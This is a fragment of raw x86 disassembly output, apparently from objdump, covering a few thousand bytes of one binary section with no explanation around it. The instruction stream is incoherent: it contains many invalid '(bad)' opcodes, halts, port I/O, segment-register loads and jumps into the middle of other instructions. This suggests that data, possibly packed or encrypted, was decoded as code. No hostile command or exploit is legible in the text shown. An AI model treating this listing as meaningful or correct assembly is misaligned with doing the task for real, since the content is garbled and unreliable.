  433ebb:	23 a5 05 6b 6e ed    	and    -0x129194fb(%ebp),%esp
  433ec1:	08 46 89             	or     %al,-0x77(%esi)
  433ec4:	a3 ce e4 8c d2       	mov    %eax,0xd28ce4ce
  433ec9:	86 1d 74 5b 2f ae    	xchg   %bl,0xae2f5b74
  433ecf:	f9                   	stc
  433ed0:	bd 75 b6 5a 66       	mov    $0x665ab675,%ebp
  433ed5:	50                   	push   %eax
  433ed6:	8e 13                	mov    (%ebx),%ss
  433ed8:	db e3                	fninit
  433eda:	d6                   	salc
  433edb:	5a                   	pop    %edx
  433edc:	35 17 b7 15 f9       	xor    $0xf915b717,%eax
  433ee1:	f4                   	hlt
  433ee2:	48                   	dec    %eax
  433ee3:	8b 3f                	mov    (%edi),%edi
  433ee5:	0f 53 09             	rcpps  (%ecx),%xmm1
  433ee8:	ce                   	into
  433ee9:	0d ff ce fa 08       	or     $0x8faceff,%eax
  433eee:	f6 ad a3 e8 52 fa    	imulb  -0x5ad175d(%ebp)
  433ef4:	d0 ef                	shr    $1,%bh
  433ef6:	1d 9a 91 53 40       	sbb    $0x4053919a,%eax
  433efb:	51                   	push   %ecx
  433efc:	f5                   	cmc
  433efd:	52                   	push   %edx
  433efe:	dd e5                	fucom  %st(5)
  433f00:	ac                   	lods   %ds:(%esi),%al
  433f01:	a9 9f c7 0d 87       	test   $0x870dc79f,%eax
  433f06:	5e                   	pop    %esi
  433f07:	8b 41 57             	mov    0x57(%ecx),%eax
  433f0a:	46                   	inc    %esi
  433f0b:	38 9d e7 8c b4 c8    	cmp    %bl,-0x374b7319(%ebp)
  433f11:	49                   	dec    %ecx
  433f12:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  433f13:	d8 31                	fdivs  (%ecx)
  433f15:	5f                   	pop    %edi
  433f16:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  433f17:	44                   	inc    %esp
  433f18:	ff 82 24 52 f5 1e    	incl   0x1ef55224(%edx)
  433f1e:	00 cf                	add    %cl,%bh
  433f20:	88 28                	mov    %ch,(%eax)
  433f22:	b0 0a                	mov    $0xa,%al
  433f24:	61                   	popa
  433f25:	ca 41 71             	lret   $0x7141
  433f28:	fa                   	cli
  433f29:	5e                   	pop    %esi
  433f2a:	f1                   	int1
  433f2b:	53                   	push   %ebx
  433f2c:	07                   	pop    %es
  433f2d:	9c                   	pushf
  433f2e:	97                   	xchg   %eax,%edi
  433f2f:	98                   	cwtl
  433f30:	28 3f                	sub    %bh,(%edi)
  433f32:	9b                   	fwait
  433f33:	b9 63 39 86 3f       	mov    $0x3f863963,%ecx
  433f38:	d2 48 68             	rorb   %cl,0x68(%eax)
  433f3b:	2a f4                	sub    %ah,%dh
  433f3d:	c8 57 c7 6e          	enter  $0xc757,$0x6e
  433f41:	4c                   	dec    %esp
  433f42:	fa                   	cli
  433f43:	f4                   	hlt
  433f44:	96                   	xchg   %eax,%esi
  433f45:	b5 91                	mov    $0x91,%ch
  433f47:	d5 fc                	aad    $0xfc
  433f49:	dc 28                	fsubrl (%eax)
  433f4b:	74 12                	je     0x433f5f
  433f4d:	19 08                	sbb    %ecx,(%eax)
  433f4f:	9e                   	sahf
  433f50:	e4 4e                	in     $0x4e,%al
  433f52:	57                   	push   %edi
  433f53:	37                   	aaa
  433f54:	fe                   	(bad)
  433f55:	6e                   	outsb  %ds:(%esi),(%dx)
  433f56:	93                   	xchg   %eax,%ebx
  433f57:	0c eb                	or     $0xeb,%al
  433f59:	3b d1                	cmp    %ecx,%edx
  433f5b:	7c ab                	jl     0x433f08
  433f5d:	fd                   	std
  433f5e:	d7                   	xlat   %ds:(%ebx)
  433f5f:	b6 72                	mov    $0x72,%dh
  433f61:	47                   	inc    %edi
  433f62:	54                   	push   %esp
  433f63:	45                   	inc    %ebp
  433f64:	20 77 43             	and    %dh,0x43(%edi)
  433f67:	c3                   	ret
  433f68:	fd                   	std
  433f69:	00 98 1c 3c b4 73    	add    %bl,0x73b43c1c(%eax)
  433f6f:	8c fd                	mov    %?,%ebp
  433f71:	71 55                	jno    0x433fc8
  433f73:	dc b0 e5 a4 eb 19    	fdivl  0x19eba4e5(%eax)
  433f79:	41                   	inc    %ecx
  433f7a:	6a 39                	push   $0x39
  433f7c:	5c                   	pop    %esp
  433f7d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  433f7e:	32 2c e4             	xor    (%esp,%eiz,8),%ch
  433f81:	2e 23 50 5f          	and    %cs:0x5f(%eax),%edx
  433f85:	da 24 70             	fisubl (%eax,%esi,2)
  433f88:	48                   	dec    %eax
  433f89:	92                   	xchg   %eax,%edx
  433f8a:	f4                   	hlt
  433f8b:	89 c5                	mov    %eax,%ebp
  433f8d:	f3 88 a6 8a 47 94 72 	xrelease mov %ah,0x7294478a(%esi)
  433f94:	76 b7                	jbe    0x433f4d
  433f96:	3d 27 fd 5f df       	cmp    $0xdf5ffd27,%eax
  433f9b:	4e                   	dec    %esi
  433f9c:	e0 14                	loopne 0x433fb2
  433f9e:	73 f0                	jae    0x433f90
  433fa0:	f1                   	int1
  433fa1:	2a 89 ae fa c1 49    	sub    0x49c1faae(%ecx),%cl
  433fa7:	1f                   	pop    %ds
  433fa8:	ad                   	lods   %ds:(%esi),%eax
  433fa9:	4b                   	dec    %ebx
  433faa:	4d                   	dec    %ebp
  433fab:	c2 ee ab             	ret    $0xabee
  433fae:	5d                   	pop    %ebp
  433faf:	bd ba 2a 37 d5       	mov    $0xd5372aba,%ebp
  433fb4:	56                   	push   %esi
  433fb5:	cc                   	int3
  433fb6:	88 a5 60 26 04 21    	mov    %ah,0x21042660(%ebp)
  433fbc:	84 b9 12 b5 63 5f    	test   %bh,0x5f63b512(%ecx)
  433fc2:	5d                   	pop    %ebp
  433fc3:	67 99                	addr16 cltd
  433fc5:	6d                   	insl   (%dx),%es:(%edi)
  433fc6:	49                   	dec    %ecx
  433fc7:	fd                   	std
  433fc8:	d9 3c b4             	fnstcw (%esp,%esi,4)
  433fcb:	72 08                	jb     0x433fd5
  433fcd:	42                   	inc    %edx
  433fce:	b9 3a f1 42 1c       	mov    $0x1c42f13a,%ecx
  433fd3:	01 8e 2d e2 54 10    	add    %ecx,0x1054e22d(%esi)
  433fd9:	bd 30 10 3a 1e       	mov    $0x1e3a1030,%ebp
  433fde:	c9                   	leave
  433fdf:	02 e3                	add    %bl,%ah
  433fe1:	88 b4 f2 4d f0 e1 e7 	mov    %dh,-0x181e0fb3(%edx,%esi,8)
  433fe8:	d4 92                	aam    $0x92
  433fea:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  433feb:	ab                   	stos   %eax,%es:(%edi)
  433fec:	b6 b0                	mov    $0xb0,%dh
  433fee:	3b 81 b0 7c 57 e1    	cmp    -0x1ea88350(%ecx),%eax
  433ff4:	40                   	inc    %eax
  433ff5:	ab                   	stos   %eax,%es:(%edi)
  433ff6:	fb                   	sti
  433ff7:	ec                   	in     (%dx),%al
  433ff8:	a8 ad                	test   $0xad,%al
  433ffa:	cd d3                	int    $0xd3
  433ffc:	bb a4 af 34 3b       	mov    $0x3b34afa4,%ebx
  434001:	90                   	nop
  434002:	84 c2                	test   %al,%dl
  434004:	6c                   	insb   (%dx),%es:(%edi)
  434005:	5d                   	pop    %ebp
  434006:	18 37                	sbb    %dh,(%edi)
  434008:	4c                   	dec    %esp
  434009:	81 40 88 7d 11 a1 28 	addl   $0x28a1117d,-0x78(%eax)
  434010:	e7 5f                	out    %eax,$0x5f
  434012:	c5 de 91             	(bad)
  434015:	89 6b 96             	mov    %ebp,-0x6a(%ebx)
  434018:	97                   	xchg   %eax,%edi
  434019:	47                   	inc    %edi
  43401a:	d6                   	salc
  43401b:	1d 29 df 96 2e       	sbb    $0x2e96df29,%eax
  434020:	21 2e                	and    %ebp,(%esi)
  434022:	e1 a5                	loope  0x433fc9
  434024:	57                   	push   %edi
  434025:	5a                   	pop    %edx
  434026:	4d                   	dec    %ebp
  434027:	49                   	dec    %ecx
  434028:	3c 3f                	cmp    $0x3f,%al
  43402a:	cc                   	int3
  43402b:	3f                   	aas
  43402c:	57                   	push   %edi
  43402d:	ed                   	in     (%dx),%eax
  43402e:	48                   	dec    %eax
  43402f:	07                   	pop    %es
  434030:	63 63 88             	arpl   %esp,-0x78(%ebx)
  434033:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  434034:	ab                   	stos   %eax,%es:(%edi)
  434035:	ea 63 85 f4 8b d3 ae 	ljmp   $0xaed3,$0x8bf48563
  43403c:	be 0d 26 b6 f5       	mov    $0xf5b6260d,%esi
  434041:	ba 3b 60 aa 69       	mov    $0x69aa603b,%edx
  434046:	f8                   	clc
  434047:	9c                   	pushf
  434048:	68 28 18 7a 0d       	push   $0xd7a1828
  43404d:	91                   	xchg   %eax,%ecx
  43404e:	b4 69                	mov    $0x69,%ah
  434050:	cc                   	int3
  434051:	48                   	dec    %eax
  434052:	ba d3 f3 d2 65       	mov    $0x65d2f3d3,%edx
  434057:	5e                   	pop    %esi
  434058:	45                   	inc    %ebp
  434059:	b4 46                	mov    $0x46,%ah
  43405b:	10 39                	adc    %bh,(%ecx)
  43405d:	52                   	push   %edx
  43405e:	a2 dc 51 34 d4       	mov    %al,0xd43451dc
  434063:	be ce 96 f4 f7       	mov    $0xf7f496ce,%esi
  434068:	25 d3 6a 40 1b       	and    $0x1b406ad3,%eax
  43406d:	d5 62                	aad    $0x62
  43406f:	01 81 4f c8 e5 77    	add    %eax,0x77e5c84f(%ecx)
  434075:	1f                   	pop    %ds
  434076:	82 fd 3d             	cmp    $0x3d,%ch
  434079:	1e                   	push   %ds
  43407a:	b4 1a                	mov    $0x1a,%ah
  43407c:	7e 5a                	jle    0x4340d8
  43407e:	0e                   	push   %cs
  43407f:	6d                   	insl   (%dx),%es:(%edi)
  434080:	e3 38                	jecxz  0x4340ba
  434082:	eb b7                	jmp    0x43403b
  434084:	42                   	inc    %edx
  434085:	4c                   	dec    %esp
  434086:	4d                   	dec    %ebp
  434087:	34 14                	xor    $0x14,%al
  434089:	91                   	xchg   %eax,%ecx
  43408a:	20 7f 9a             	and    %bh,-0x66(%edi)
  43408d:	76 49                	jbe    0x4340d8
  43408f:	ba 62 49 24 bd       	mov    $0xbd244962,%edx
  434094:	fb                   	sti
  434095:	7a 86                	jp     0x43401d
  434097:	1b c5                	sbb    %ebp,%eax
  434099:	2f                   	das
  43409a:	df b8 cd 69 72 e6    	fistpll -0x198d9633(%eax)
  4340a0:	43                   	inc    %ebx
  4340a1:	8a 21                	mov    (%ecx),%ah
  4340a3:	82 a5 e9 a1 2f 69 70 	andb   $0x70,0x692fa1e9(%ebp)
  4340aa:	34 24                	xor    $0x24,%al
  4340ac:	99                   	cltd
  4340ad:	71 1d                	jno    0x4340cc
  4340af:	cd ff                	int    $0xff
  4340b1:	9f                   	lahf
  4340b2:	12 9b 68 79 e2 05    	adc    0x5e27968(%ebx),%bl
  4340b8:	c0 5a c4 77          	rcrb   $0x77,-0x3c(%edx)
  4340bc:	a0 2a c6 ae 67       	mov    0x67aec62a,%al
  4340c1:	aa                   	stos   %al,%es:(%edi)
  4340c2:	01 9a f9 eb f4 a6    	add    %ebx,-0x590b1407(%edx)
  4340c8:	f5                   	cmc
  4340c9:	de 4e 4c             	fimuls 0x4c(%esi)
  4340cc:	a0 c0 41 22 a3       	mov    0xa32241c0,%al
  4340d1:	59                   	pop    %ecx
  4340d2:	6e                   	outsb  %ds:(%esi),(%dx)
  4340d3:	f4                   	hlt
  4340d4:	6b 93 36 e0 cf 13 02 	imul   $0x2,0x13cfe036(%ebx),%edx
  4340db:	02 70 a6             	add    -0x5a(%eax),%dh
  4340de:	7f c9                	jg     0x4340a9
  4340e0:	ae                   	scas   %es:(%edi),%al
  4340e1:	c5 93 f2 95 86 18    	lds    0x188695f2(%ebx),%edx
  4340e7:	08 e7                	or     %ah,%bh
  4340e9:	45                   	inc    %ebp
  4340ea:	fe 4b a7             	decb   -0x59(%ebx)
  4340ed:	48                   	dec    %eax
  4340ee:	23 3b                	and    (%ebx),%edi
  4340f0:	36 72 08             	ss jb  0x4340fb
  4340f3:	e0 38                	loopne 0x43412d
  4340f5:	98                   	cwtl
  4340f6:	ad                   	lods   %ds:(%esi),%eax
  4340f7:	e0 68                	loopne 0x434161
  4340f9:	2f                   	das
  4340fa:	4a                   	dec    %edx
  4340fb:	59                   	pop    %ecx
  4340fc:	4a                   	dec    %edx
  4340fd:	46                   	inc    %esi
  4340fe:	bb 96 f6 99 0a       	mov    $0xa99f696,%ebx
  434103:	cc                   	int3
  434104:	61                   	popa
  434105:	0b 2b                	or     (%ebx),%ebp
  434107:	5e                   	pop    %esi
  434108:	fa                   	cli
  434109:	c4                   	(bad)
  43410a:	de 07                	fiadds (%edi)
  43410c:	f8                   	clc
  43410d:	a1 e8 fb b7 e7       	mov    0xe7b7fbe8,%eax
  434112:	9f                   	lahf
  434113:	9f                   	lahf
  434114:	4e                   	dec    %esi
  434115:	60                   	pusha
  434116:	59                   	pop    %ecx
  434117:	93                   	xchg   %eax,%ebx
  434118:	83 f5 24             	xor    $0x24,%ebp
  43411b:	2c 01                	sub    $0x1,%al
  43411d:	ae                   	scas   %es:(%edi),%al
  43411e:	37                   	aaa
  43411f:	ee                   	out    %al,(%dx)
  434120:	f3 1b 91 a9 be 94 2f 	repz sbb 0x2f94bea9(%ecx),%edx
  434127:	cb                   	lret
  434128:	45                   	inc    %ebp
  434129:	fe 0a                	decb   (%edx)
  43412b:	0b 1a                	or     (%edx),%ebx
  43412d:	79 ae                	jns    0x4340dd
  43412f:	69 f8 a3 61 bf 8f    	imul   $0x8fbf61a3,%eax,%edi
  434135:	b3 0a                	mov    $0xa,%bl
  434137:	5a                   	pop    %edx
  434138:	89 e9                	mov    %ebp,%ecx
  43413a:	09 10                	or     %edx,(%eax)
  43413c:	22 19                	and    (%ecx),%bl
  43413e:	b9 01 09 45 0c       	mov    $0xc450901,%ecx
  434143:	c5 ce 9d             	(bad)
  434146:	dc ae 33 a8 4e cc    	fsubrl -0x33b157cd(%esi)
  43414c:	15 aa 39 a7 d3       	adc    $0xd3a739aa,%eax
  434151:	97                   	xchg   %eax,%edi
  434152:	9b                   	fwait
  434153:	a2 2a f2 d3 db       	mov    %al,0xdbd3f22a
  434158:	43                   	inc    %ebx
  434159:	f2 a1 92 a3 41 f4    	repnz mov 0xf441a392,%eax
  43415f:	47                   	inc    %edi
  434160:	26 25 20 5c b5 cc    	es and $0xccb55c20,%eax
  434166:	d2 93 63 3a d5 30    	rclb   %cl,0x30d53a63(%ebx)
  43416c:	30 60 12             	xor    %ah,0x12(%eax)
  43416f:	72 e8                	jb     0x434159
  434171:	b7 c3                	mov    $0xc3,%bh
  434173:	84 b6 29 79 a1 68    	test   %dh,0x68a17929(%esi)
  434179:	6e                   	outsb  %ds:(%esi),(%dx)
  43417a:	5d                   	pop    %ebp
  43417b:	21 cb                	and    %ecx,%ebx
  43417d:	15 70 c9 12 1a       	adc    $0x1a12c970,%eax
  434182:	8a 60 b4             	mov    -0x4c(%eax),%ah
  434185:	8e 08                	mov    (%eax),%cs
  434187:	a2 55 db c2 99       	mov    %al,0x99c2db55
  43418c:	93                   	xchg   %eax,%ebx
  43418d:	e6 0c                	out    %al,$0xc
  43418f:	2d 21 02 4a b6       	sub    $0xb64a0221,%eax
  434194:	34 c4                	xor    $0xc4,%al
  434196:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  434197:	5b                   	pop    %ebx
  434198:	a8 a6                	test   $0xa6,%al
  43419a:	09 95 f1 60 1d 20    	or     %edx,0x201d60f1(%ebp)
  4341a0:	41                   	inc    %ecx
  4341a1:	f0 ee                	lock out %al,(%dx)
  4341a3:	d1 dd                	rcr    $1,%ebp
  4341a5:	dc 46 2a             	faddl  0x2a(%esi)
  4341a8:	46                   	inc    %esi
  4341a9:	21 97 dd 1f 9b 47    	and    %edx,0x479b1fdd(%edi)
  4341af:	34 12                	xor    $0x12,%al
  4341b1:	8c 7d c7             	mov    %?,-0x39(%ebp)
  4341b4:	af                   	scas   %es:(%edi),%eax
  4341b5:	fb                   	sti
  4341b6:	6d                   	insl   (%dx),%es:(%edi)
  4341b7:	8c 7b 25             	mov    %?,0x25(%ebx)
  4341ba:	43                   	inc    %ebx
  4341bb:	01 ed                	add    %ebp,%ebp
  4341bd:	7c 39                	jl     0x4341f8
  4341bf:	e8 30 7f fa ce       	call   0xcf3dc0f4
  4341c4:	66 f1                	data16 int1
  4341c6:	4d                   	dec    %ebp
  4341c7:	f9                   	stc
  4341c8:	db 84 58 1b eb d1 66 	fildl  0x66d1eb1b(%eax,%ebx,2)
  4341cf:	42                   	inc    %edx
  4341d0:	3b 6b 18             	cmp    0x18(%ebx),%ebp
  4341d3:	83 66 c0 a6          	andl   $0xffffffa6,-0x40(%esi)
  4341d7:	3d c7 a4 0c f0       	cmp    $0xf00ca4c7,%eax
  4341dc:	51                   	push   %ecx
  4341dd:	0b 2c 02             	or     (%edx,%eax,1),%ebp
  4341e0:	82 4b 2a 80          	orb    $0x80,0x2a(%ebx)
  4341e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4341e5:	59                   	pop    %ecx
  4341e6:	50                   	push   %eax
  4341e7:	33 6d a7             	xor    -0x59(%ebp),%ebp
  4341ea:	97                   	xchg   %eax,%edi
  4341eb:	26 8f                	es (bad)
  4341ed:	f7 ac 56 f6 47 bc 68 	imull  0x68bc47f6(%esi,%edx,2)
  4341f4:	8b 37                	mov    (%edi),%esi
  4341f6:	30 2c 7c             	xor    %ch,(%esp,%edi,2)
  4341f9:	0a 99 52 b5 ba 69    	or     0x69bab552(%ecx),%bl
  4341ff:	52                   	push   %edx
  434200:	b9 7c 4e f7 e1       	mov    $0xe1f74e7c,%ecx
  434205:	19 a9 8b 66 8f 50    	sbb    %ebp,0x508f668b(%ecx)
  43420b:	8c e8                	mov    %gs,%eax
  43420d:	d9 90 ed f3 57 1a    	fsts   0x1a57f3ed(%eax)
  434213:	9c                   	pushf
  434214:	5a                   	pop    %edx
  434215:	7f 39                	jg     0x434250
  434217:	c1 21 32             	shll   $0x32,(%ecx)
  43421a:	33 05 1a 32 5a 3d    	xor    0x3d5a321a,%eax
  434220:	43                   	inc    %ebx
  434221:	b0 8e                	mov    $0x8e,%al
  434223:	50                   	push   %eax
  434224:	fc                   	cld
  434225:	e4 a8                	in     $0xa8,%al
  434227:	bb 48 76 11 26       	mov    $0x26117648,%ebx
  43422c:	99                   	cltd
  43422d:	c3                   	ret
  43422e:	75 33                	jne    0x434263
  434230:	dc 04 70             	faddl  (%eax,%esi,2)
  434233:	4e                   	dec    %esi
  434234:	19 a9 08 67 d3 ea    	sbb    %ebp,-0x152c98f8(%ecx)
  43423a:	6c                   	insb   (%dx),%es:(%edi)
  43423b:	f1                   	int1
  43423c:	1a 65 15             	sbb    0x15(%ebp),%ah
  43423f:	2d 18 79 83 86       	sub    $0x86837918,%eax
  434244:	69 58 d4 0e 33 bf d0 	imul   $0xd0bf330e,-0x2c(%eax),%ebx
  43424b:	05 39 92 70 b4       	add    $0xb4709239,%eax
  434250:	58                   	pop    %eax
  434251:	44                   	inc    %esp
  434252:	8a 51 f6             	mov    -0xa(%ecx),%dl
  434255:	0f ce                	bswap  %esi
  434257:	50                   	push   %eax
  434258:	50                   	push   %eax
  434259:	0c 1d                	or     $0x1d,%al
  43425b:	ac                   	lods   %ds:(%esi),%al
  43425c:	9b                   	fwait
  43425d:	ef                   	out    %eax,(%dx)
  43425e:	e5 29                	in     $0x29,%eax
  434260:	fc                   	cld
  434261:	94                   	xchg   %eax,%esp
  434262:	a2 da 4a 66 f2       	mov    %al,0xf2664ada
  434267:	89 12                	mov    %edx,(%edx)
  434269:	33 39                	xor    (%ecx),%edi
  43426b:	4d                   	dec    %ebp
  43426c:	87 c9                	xchg   %ecx,%ecx
  43426e:	10 3d c2 7a 5c f3    	adc    %bh,0xf35c7ac2
  434274:	69 c5 54 a0 0d c2    	imul   $0xc20da054,%ebp,%eax
  43427a:	3d f6 b0 6c 8b       	cmp    $0x8b6cb0f6,%eax
  43427f:	0e                   	push   %cs
  434280:	01 48 ff             	add    %ecx,-0x1(%eax)
  434283:	d4 82                	aam    $0x82
  434285:	e9 87 21 c6 3a       	jmp    0x3b096411
  43428a:	2e 2b 4b 79          	sub    %cs:0x79(%ebx),%ecx
  43428e:	ff                   	(bad)
  43428f:	b9 d9 05 29 5d       	mov    $0x5d2905d9,%ecx
  434294:	bc b6 0c 29 43       	mov    $0x43290cb6,%esp
  434299:	27                   	daa
  43429a:	f2 8d 3c b4          	repnz lea (%esp,%esi,4),%edi
  43429e:	eb 61                	jmp    0x434301
  4342a0:	4b                   	dec    %ebx
  4342a1:	16                   	push   %ss
  4342a2:	62 9b 7c 3c 16 70    	bound  %ebx,0x70163c7c(%ebx)
  4342a8:	e1 2a                	loope  0x4342d4
  4342aa:	4b                   	dec    %ebx
  4342ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4342ac:	ec                   	in     (%dx),%al
  4342ad:	aa                   	stos   %al,%es:(%edi)
  4342ae:	24 7f                	and    $0x7f,%al
  4342b0:	96                   	xchg   %eax,%esi
  4342b1:	83 2b 47             	subl   $0x47,(%ebx)
  4342b4:	f0 8a 71 87          	lock mov -0x79(%ecx),%dh
  4342b8:	7a b5                	jp     0x43426f
  4342ba:	5f                   	pop    %edi
  4342bb:	db c4                	fcmovnb %st(4),%st
  4342bd:	40                   	inc    %eax
  4342be:	d7                   	xlat   %ds:(%ebx)
  4342bf:	a3 c0 38 2c 88       	mov    %eax,0x882c38c0
  4342c4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4342c5:	3a 99 82 ab 53 e7    	cmp    -0x18ac547e(%ecx),%bl
  4342cb:	d8 ee                	fsubr  %st(6),%st
  4342cd:	04 f4                	add    $0xf4,%al
  4342cf:	b0 9e                	mov    $0x9e,%al
  4342d1:	3e 23 00             	and    %ds:(%eax),%eax
  4342d4:	93                   	xchg   %eax,%ebx
  4342d5:	00 27                	add    %ah,(%edi)
  4342d7:	74 3d                	je     0x434316
  4342d9:	1b 57 20             	sbb    0x20(%edi),%edx
  4342dc:	45                   	inc    %ebp
  4342dd:	c8 8c be 7b          	enter  $0xbe8c,$0x7b
  4342e1:	9e                   	sahf
  4342e2:	60                   	pusha
  4342e3:	29 18                	sub    %ebx,(%eax)
  4342e5:	30 0f                	xor    %cl,(%edi)
  4342e7:	ab                   	stos   %eax,%es:(%edi)
  4342e8:	cd f1                	int    $0xf1
  4342ea:	21 a3 97 4c c4 d0    	and    %esp,-0x2f3bb369(%ebx)
  4342f0:	9d                   	popf
  4342f1:	4b                   	dec    %ebx
  4342f2:	85 85 63 c6 00 db    	test   %eax,-0x24ff399d(%ebp)
  4342f8:	42                   	inc    %edx
  4342f9:	3d 7b 1b 6a 7d       	cmp    $0x7d6a1b7b,%eax
  4342fe:	5d                   	pop    %ebp
  4342ff:	82 d1 d4             	adc    $0xd4,%cl
  434302:	6d                   	insl   (%dx),%es:(%edi)
  434303:	24 a0                	and    $0xa0,%al
  434305:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  434306:	7c 5c                	jl     0x434364
  434308:	4c                   	dec    %esp
  434309:	3c 86                	cmp    $0x86,%al
  43430b:	09 8e 79 c2 10 e4    	or     %ecx,-0x1bef3d87(%esi)
  434311:	a8 57                	test   $0x57,%al
  434313:	be 37 62 f7 4a       	mov    $0x4af76237,%esi
  434318:	e4 d9                	in     $0xd9,%al
  43431a:	aa                   	stos   %al,%es:(%edi)
  43431b:	7e c1                	jle    0x4342de
  43431d:	92                   	xchg   %eax,%edx
  43431e:	f8                   	clc
  43431f:	59                   	pop    %ecx
  434320:	45                   	inc    %ebp
  434321:	f6 4a ca 12          	testb  $0x12,-0x36(%edx)
  434325:	18 0e                	sbb    %cl,(%esi)
  434327:	7a eb                	jp     0x434314
  434329:	03 ea                	add    %edx,%ebp
  43432b:	07                   	pop    %es
  43432c:	0d d4 bc 0f 18       	or     $0x180fbcd4,%eax
  434331:	1a 60 b4             	sbb    -0x4c(%eax),%ah
  434334:	f0 cc                	lock int3
  434336:	86 c4                	xchg   %al,%ah
  434338:	10 4d 42             	adc    %cl,0x42(%ebp)
  43433b:	ba 7e 04 7b ed       	mov    $0xed7b047e,%edx
  434340:	1f                   	pop    %ds
  434341:	bd fc 6c 48 74       	mov    $0x74486cfc,%ebp
  434346:	1e                   	push   %ds
  434347:	eb fe                	jmp    0x434347
  434349:	b4 2b                	mov    $0x2b,%ah
  43434b:	2f                   	das
  43434c:	b5 27                	mov    $0x27,%ch
  43434e:	1e                   	push   %ds
  43434f:	9c                   	pushf
  434350:	bb 44 2b 4a 15       	mov    $0x154a2b44,%ebx
  434355:	99                   	cltd
  434356:	81 47 36 5c fb 47 fe 	addl   $0xfe47fb5c,0x36(%edi)
  43435d:	d7                   	xlat   %ds:(%ebx)
  43435e:	10 50 d6             	adc    %dl,-0x2a(%eax)
  434361:	fe                   	(bad)
  434362:	58                   	pop    %eax
  434363:	6e                   	outsb  %ds:(%esi),(%dx)
  434364:	bc 8d aa a0 cd       	mov    $0xcda0aa8d,%esp
  434369:	b8 c6 70 b1 ac       	mov    $0xacb170c6,%eax
  43436e:	d4 a3                	aam    $0xa3
  434370:	5e                   	pop    %esi
  434371:	11 a4 30 5c 53 55 67 	adc    %esp,0x6755535c(%eax,%esi,1)
  434378:	d1 f5                	shl    $1,%ebp
  43437a:	a8 93                	test   $0x93,%al
  43437c:	f8                   	clc
  43437d:	f8                   	clc
  43437e:	6a df                	push   $0xffffffdf
  434380:	7b 70                	jnp    0x4343f2
  434382:	00 18                	add    %bl,(%eax)
  434384:	ad                   	lods   %ds:(%esi),%eax
  434385:	43                   	inc    %ebx
  434386:	cf                   	iret
  434387:	09 35 bd b5 9c 6c    	or     %esi,0x6c9cb5bd
  43438d:	2d 63 5a d3 d3       	sub    $0xd3d35a63,%eax
  434392:	14 d6                	adc    $0xd6,%al
  434394:	dc 44 7f ac          	faddl  -0x54(%edi,%edi,2)
  434398:	90                   	nop
  434399:	69 2d ab f7 7c 15 44 	imul   $0xdafd3544,0x157cf7ab,%ebp
  4343a0:	35 fd da 
  4343a3:	9c                   	pushf
  4343a4:	5c                   	pop    %esp
  4343a5:	79 22                	jns    0x4343c9
  4343a7:	11 26                	adc    %esp,(%esi)
  4343a9:	ed                   	in     (%dx),%eax
  4343aa:	e9 f6 32 c4 6d       	jmp    0x6e0776a5
  4343af:	f8                   	clc
  4343b0:	b9 39 37 10 93       	mov    $0x93103739,%ecx
  4343b5:	0b 6e 9d             	or     -0x63(%esi),%ebp
  4343b8:	3e c3                	ds ret
  4343ba:	03 68 6e             	add    0x6e(%eax),%ebp
  4343bd:	a0 17 f4 ef c2       	mov    0xc2eff417,%al
  4343c2:	e4 47                	in     $0x47,%al
  4343c4:	41                   	inc    %ecx
  4343c5:	bf 3b aa df bf       	mov    $0xbfdfaa3b,%edi
  4343ca:	e1 56                	loope  0x434422
  4343cc:	65 4b                	gs dec %ebx
  4343ce:	c3                   	ret
  4343cf:	41                   	inc    %ecx
  4343d0:	09 17                	or     %edx,(%edi)
  4343d2:	7c 52                	jl     0x434426
  4343d4:	97                   	xchg   %eax,%edi
  4343d5:	11 ee                	adc    %ebp,%esi
  4343d7:	4e                   	dec    %esi
  4343d8:	e4 91                	in     $0x91,%al
  4343da:	14 5f                	adc    $0x5f,%al
  4343dc:	dd 29                	(bad) (%ecx)
  4343de:	19 3c 62             	sbb    %edi,(%edx,%eiz,2)
  4343e1:	82 90 2b 7e 55 4e 39 	adcb   $0x39,0x4e557e2b(%eax)
  4343e8:	7f e8                	jg     0x4343d2
  4343ea:	38 b9 29 32 34 3d    	cmp    %bh,0x3d343229(%ecx)
  4343f0:	3e d2 a2 e3 87 59 27 	shlb   %cl,%ds:0x275987e3(%edx)
  4343f7:	4f                   	dec    %edi
  4343f8:	46                   	inc    %esi
  4343f9:	f7 ac 3c 68 57 28 d0 	imull  -0x2fd7a898(%esp,%edi,1)
  434400:	bb 8e 5f bb b6       	mov    $0xb6bb5f8e,%ebx
  434405:	3e 44                	ds inc %esp
  434407:	41                   	inc    %ecx
  434408:	4b                   	dec    %ebx
  434409:	86 b2 48 ef bd 90    	xchg   %dh,-0x6f4210b8(%edx)
  43440f:	32 aa 4e df 38 e9    	xor    -0x16c720b2(%edx),%ch
  434415:	52                   	push   %edx
  434416:	44                   	inc    %esp
  434417:	43                   	inc    %ebx
  434418:	3d 35 fb 45 a1       	cmp    $0xa145fb35,%eax
  43441d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  43441e:	9c                   	pushf
  43441f:	da e8                	(bad)
  434421:	2d aa f0 3f 23       	sub    $0x233ff0aa,%eax
  434426:	db e1                	fndisi(8087 only)
  434428:	64 57                	fs push %edi
  43442a:	00 b4 e3 7e b2 80 4d 	add    %dh,0x4d80b27e(%ebx,%eiz,8)
  434431:	1a 83 5d e0 66 84    	sbb    -0x7b991fa3(%ebx),%al
  434437:	da 71 08             	fidivl 0x8(%ecx)
  43443a:	ba 1a 37 9f 49       	mov    $0x499f371a,%edx
  43443f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  434440:	eb 87                	jmp    0x4343c9
  434442:	46                   	inc    %esi
  434443:	6e                   	outsb  %ds:(%esi),(%dx)
  434444:	88 fe                	mov    %bh,%dh
  434446:	f3 ac                	rep lods %ds:(%esi),%al
  434448:	82 71 60 f0          	xorb   $0xf0,0x60(%ecx)
  43444c:	4e                   	dec    %esi
  43444d:	f8                   	clc
  43444e:	bc 97 29 57 09       	mov    $0x9572997,%esp
  434453:	63 d9                	arpl   %ebx,%ecx
